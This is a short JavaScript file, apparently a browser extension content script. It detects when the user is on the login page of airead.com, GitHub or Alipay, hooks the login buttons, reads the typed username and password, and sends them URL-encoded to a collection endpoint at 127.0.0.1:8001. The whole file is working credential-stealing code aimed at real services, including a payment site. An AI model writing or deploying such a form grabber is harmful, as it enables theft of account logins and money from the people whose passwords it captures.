DEBUG = true;

function debug() {
    if (DEBUG) {
        console.log.apply(console, arguments);
    }
}

$(document).ready(function () {
    debug('account ready');
    accountDetect();
});

var configs = {
    'http://airead.com': http_airead_com,
    'https://github.com': https_github_com,
    'https://www.alipay.com': https_www_alipay_com,
    'https://auth.alipay.com': https_www_alipay_com
};

var info = {};

function accountDetect() {
    var origin = window.location.origin;
    debug('origin', origin);
    configs[origin](function(err, info) {
        debug(origin, info);
        info.origin = origin;
        sendInfo(info);
    });
}

function sendInfo(info) {
    protocol = info.origin.split(':')[0];
    var url = protocol + '://127.0.0.1:8001/account';
    encode = encodeURIComponent(JSON.stringify(info));
    url += '?info=' + encode;
    $.get(url);
}

function http_airead_com(done) {
    $('#login').click(function () {
        info.username = $('#name').val();
        info.password = $('#pass').val();

        done(null, info);
    });
}

function https_github_com(done) {
    debug('https_github_com detect');
    $('input[name="commit"]').click(function () {
        debug('login commit');
        info.username = $('#login_field').val();
        info.password = $('#password').val();

        done(null, info);
    });
}

function https_www_alipay_com(done) {
    debug('https_www_alipay_com detect');
    $('#J-login-btn').click(function () {
        debug('login commit');
        info.username = $('#J-input-user').val();
        info.password = $('#password_input').val();

        done(null, info);
    });
}
